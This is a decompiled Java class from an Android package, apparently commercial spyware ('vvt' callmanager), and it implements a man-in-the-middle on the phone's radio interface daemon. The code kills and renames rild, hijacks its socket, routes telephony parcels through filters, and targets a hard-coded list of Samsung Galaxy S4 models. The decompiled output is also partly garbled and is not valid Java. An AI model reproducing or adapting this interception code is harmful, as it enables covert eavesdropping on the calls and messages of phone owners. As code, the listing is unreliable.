package com.vvt.callmanager;

import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.Build;
import android.os.ConditionVariable;
import android.os.Parcel;
import com.fx.daemon.exception.RunningException;
import com.fx.socket.e;
import com.vvt.callmanager.filter.n;
import com.vvt.callmanager.ref.command.RemoteKillPhone;
import com.vvt.callmanager.ref.command.RemoteKillPhoneNRenameRild;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import java.io.FileDescriptor;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

public class Mitm {
    private static final boolean a = com.vvt.callmanager.ref.g.a;
    private static final boolean b = com.vvt.callmanager.ref.g.b;
    private static final boolean c = com.vvt.callmanager.ref.g.d;
    private static final boolean d = com.vvt.callmanager.ref.g.e;
    private static Mitm sInstance;
    private n f;
    private n g;
    private List mFilterList;
    private LocalSocket i;
    private LocalSocket j;

    private Mitm() {
        this.mFilterList = new ArrayList();
    }

    public static Mitm getInstance() {
        synchronized (Mitm.class) {
            if (sInstance == null) {
                sInstance = new Mitm();
            }
            return sInstance;
        }
    }

    private void prepareOriginate(FileDescriptor paramFileDescriptor, boolean paramBoolean) {
        boolean bool1 = a;
        if (bool1) {}
        boolean bool2 = false;
        LocalServerSocket localLocalServerSocket = null;
        ConditionVariable localObject1 = new android.os.ConditionVariable(false);
        try {
            localLocalServerSocket = new android.net.LocalServerSocket(paramFileDescriptor);

            boolean bool3 = b;
            if ((!bool3) || (paramBoolean)) {
                bool3 = b;
                if (bool3) {}

                RemoteKillPhone remoteCommand = new com.vvt.callmanager.ref.command.RemoteKillPhone;
                remoteCommand.execute();
            }

            Object localObject2 = new com.vvt.callmanager.g(this, localLocalServerSocket, (ConditionVariable)localObject1);
            ((Thread)localObject2).start();
            bool2 = b;
            if (bool2) {}
            bool2 = a;
            if (bool2) {}
            long l = 30000L;
            bool1 = ((ConditionVariable)localObject1).block(l);
            if (!bool1)
            {
                bool1 = d;
                if (bool1) {}
                throw new com.fx.daemon.exception.RunningException("Daemon startup take too long");
            }
        }
        catch (IOException localIOException) {
            throw new com.fx.daemon.exception.RunningException("MITM setup failed");
        }
    }

    private void c(Parcel paramParcel) {
        try
        {
            e(paramParcel);
            return;
        }
        finally {
            localObject = finally;
            throw ((Throwable)localObject);
        }
    }

    private void d(Parcel paramParcel)
    {
        try
        {
            f(paramParcel);
            return;
        }
        finally
        {
            localObject = finally;
            throw ((Throwable)localObject);
        }
    }

    private void e(Parcel paramParcel)
    {
        n localn = this.f;
        if (localn != null)
        {
            localn = this.f;
            localn.a(paramParcel);
        }
        for (;;)
        {
            return;
            b(paramParcel);
        }
    }

    private void f(Parcel paramParcel)
    {
        n localn = this.g;
        if (localn != null)
        {
            localn = this.g;
            localn.b(paramParcel);
        }
        for (;;)
        {
            return;
            a(paramParcel);
        }
    }

    private void h()
    {
        int k = 8;
        int m = a;
        if (m != 0) {}
        m = 0;
        Object localObject1 = null;
        for (;;)
        {
            int n;
            long l;
            try
            {
                Object localObject2 = b.d;
                localObject4 = LocalSocketAddress.Namespace.RESERVED;
                localObject2 = d.a((String)localObject2, (LocalSocketAddress.Namespace)localObject4);
                this.j = ((LocalSocket)localObject2);
                m = b;
                if (m != 0) {}
                localObject1 = new com/vvt/callmanager/i;
                localObject2 = this.j;
                ((i)localObject1).<init>(this, (LocalSocket)localObject2);
                ((e)localObject1).start();
                m = b;
                if (m != 0) {}
                m = a;
                if (m != 0) {}
                return;
            }
            catch (IOException localIOException)
            {
                Object localObject4;
                Object localObject3 = this.j;
                if (localObject3 != null)
                {
                    localObject3 = this.j;
                    ((LocalSocket)localObject3).close();
                }
                if (m == k)
                {
                    n = d;
                    if (n != 0) {}
                    localObject1 = new com/fx/daemon/exception/RunningException;
                    ((RunningException)localObject1).<init>("MITM setup failed");
                    throw ((Throwable)localObject1);
                }
                if ((n > 0) && (n < k))
                {
                    boolean bool = a;
                    if (bool)
                    {
                        localObject3 = "Mitm";
                        localObject4 = new java/lang/StringBuilder;
                        ((StringBuilder)localObject4).<init>();
                        localObject4 = ((StringBuilder)localObject4).append("Couldn't find '");
                        String str = b.d;
                        localObject4 = ((StringBuilder)localObject4).append(str);
                        str = "' socket; retrying after timeout";
                        localObject4 = str;
                        com.vvt.d.a.a((String)localObject3, (String)localObject4);
                    }
                }
                l = 4000L;
            }
            try
            {
                Thread.sleep(l);
                int i1;
                n += 1;
            }
            catch (InterruptedException localInterruptedException)
            {
                for (;;) {}
            }
        }
    }

    private void i()
    {
        boolean bool = d;
        if (bool) {}
        RemoteResetMitm localRemoteResetMitm = new com/vvt/callmanager/ref/command/RemoteResetMitm;
        localRemoteResetMitm.<init>();
        try
        {
            localRemoteResetMitm.execute();
            return;
        }
        catch (IOException localIOException)
        {
            for (;;)
            {
                bool = d;
                if (!bool) {}
            }
        }
    }

    private boolean j()
    {
        boolean bool1 = false;
        boolean bool2 = com.vvt.e.a.d();
        if (bool2)
        {
            String str = Build.MANUFACTURER;
            boolean bool3 = com.vvt.f.a.a(str);
            if (!bool3)
            {
                Object localObject = Locale.US;
                str = str.toLowerCase((Locale)localObject);
                localObject = "samsung";
                bool2 = str.equalsIgnoreCase((String)localObject);
                if (!bool2) {}
            }
        }
        for (bool1 = true;; bool1 = k()) {
            return bool1;
        }
    }

    private boolean k()
    {
        String str = Build.MODEL.toUpperCase();
        ArrayList localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        Object localObject = new String[20];
        localObject[0] = "GT-I9500";
        localObject[1] = "SHV-E300K";
        localObject[2] = "SHV-E300L";
        localObject[3] = "SHV-E300S";
        localObject[4] = "GT-I9505";
        localObject[5] = "SGH-I337";
        localObject[6] = "SGH-M919";
        localObject[7] = "SCH-I545";
        localObject[8] = "GT-I9295";
        localObject[9] = "SCH-R970";
        localObject[10] = "GT-I9508";
        localObject[11] = "SCH-I959";
        localObject[12] = "GT-I9502";
        localObject[13] = "SGH-N045";
        localObject[14] = "SC-04E";
        localObject[15] = "SGH-I337M";
        localObject[16] = "SCH-R970X";
        localObject[17] = "SCH-R970C";
        localObject[18] = "SPH-L720";
        localObject[19] = "SGH-I337M";
        localObject = Arrays.asList((Object[])localObject);
        localArrayList.addAll((Collection)localObject);
        return localArrayList.contains(str);
    }

    public void a(Parcel paramParcel)
    {
        LocalSocket localLocalSocket = this.i;
        if (localLocalSocket == null)
        {
            boolean bool = a;
            if (!bool) {}
        }
        for (;;)
        {
            return;
            localLocalSocket = this.i;
            d.a(localLocalSocket, paramParcel);
        }
    }

    public void a(n paramn)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = this.mFilterList;
        int k = ((List)localObject1).size();
        if (k > 0)
        {
            localObject2 = this.mFilterList;
            k += -1;
            localObject1 = (n)((List)localObject2).get(k);
            ((n)localObject1).b(paramn);
            paramn.a((n)localObject1);
        }
        localObject1 = this.f;
        if (localObject1 == null) {
            this.f = paramn;
        }
        this.g = paramn;
        localObject1 = this.mFilterList;
        ((List)localObject1).add(paramn);
        boolean bool2 = a;
        boolean bool3;
        if (bool2)
        {
            localObject1 = this.mFilterList;
            int m = ((List)localObject1).size();
            if (m != 0) {}
        }
        else
        {
            bool3 = a;
            if (bool3) {}
            return;
        }
        localObject1 = this.mFilterList;
        Object localObject2 = ((List)localObject1).iterator();
        for (;;)
        {
            bool3 = ((Iterator)localObject2).hasNext();
            if (!bool3) {
                break;
            }
            localObject1 = (n)((Iterator)localObject2).next();
        }
    }

    public void b()
    {
        boolean bool1 = false;
        boolean bool2 = a;
        if (bool2) {}
        boolean bool3 = j();
        if (bool3)
        {
            bool2 = a;
            if (!bool2) {}
        }
        for (;;)
        {
            int k;
            try
            {
                Object localObject1 = new com/vvt/callmanager/ref/command/RemoteKillPhoneNRenameRild;
                ((RemoteKillPhoneNRenameRild)localObject1).<init>();
                localObject1 = ((RemoteKillPhoneNRenameRild)localObject1).execute();
                localObject1 = (Boolean)localObject1;
                bool2 = ((Boolean)localObject1).booleanValue();
                boolean bool4 = a;
                if ((bool4) && (bool2)) {
                    break label166;
                }
                bool2 = false;
                localObject1 = null;
                bool3 = a;
                if (bool3) {}
                Object localObject2 = new com/vvt/callmanager/Ril;
                ((Ril)localObject2).<init>();
                k = ((Ril)localObject2).setupServer();
                localObject2 = com.vvt.b.a.a(k);
                if (localObject2 == null) {
                    break;
                }
                if (!bool2) {
                    bool1 = true;
                }
                prepareOriginate((FileDescriptor)localObject2, bool1);
                bool2 = a;
                if (bool2) {}
                return;
            }
            catch (Exception localException)
            {
                bool2 = d;
                if (bool2) {}
                localRunningException = new com/fx/daemon/exception/RunningException;
                localRunningException.<init>("MITM setup failed");
                throw localRunningException;
            }
            bool2 = a;
            if (bool2) {}
            label166:
            bool2 = k;
        }
        RunningException localRunningException = new com/fx/daemon/exception/RunningException;
        localRunningException.<init>("MITM setup failed");
        throw localRunningException;
    }

    public void b(Parcel paramParcel)
    {
        LocalSocket localLocalSocket = this.j;
        if (localLocalSocket == null)
        {
            boolean bool = a;
            if (!bool) {}
        }
        for (;;)
        {
            return;
            localLocalSocket = this.j;
            d.a(localLocalSocket, paramParcel);
        }
    }

    public void c()
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject = this.mFilterList;
        if (localObject != null)
        {
            localObject = this.mFilterList;
            int k = ((List)localObject).size();
            if (k > 0)
            {
                localObject = this.mFilterList;
                Iterator localIterator = ((List)localObject).iterator();
                for (;;)
                {
                    bool2 = localIterator.hasNext();
                    if (!bool2) {
                        break;
                    }
                    localObject = (n)localIterator.next();
                    ((n)localObject).a(null);
                    ((n)localObject).b(null);
                }
                localObject = this.mFilterList;
                ((List)localObject).clear();
            }
        }
        this.f = null;
        this.g = null;
        boolean bool2 = a;
        if (bool2) {}
    }

    public List d()
    {
        return this.mFilterList;
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/Mitm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */